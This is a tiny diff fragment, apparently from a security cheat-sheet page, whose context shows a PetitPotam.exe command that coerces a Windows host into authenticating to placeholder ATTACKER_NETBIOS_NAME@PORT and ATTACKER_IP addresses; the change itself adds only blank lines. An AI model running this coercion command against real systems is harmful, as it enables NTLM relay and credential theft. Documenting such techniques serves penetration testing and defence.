@@ -14,3 +14,5 @@ updated_at: '2023-04-10T20:36:04.063259+00:00'
 ```bash
 PetitPotam.exe "ATTACKER_NETBIOS_NAME@PORT/randomfile.txt" "ATTACKER_IP"
 ```
+
+
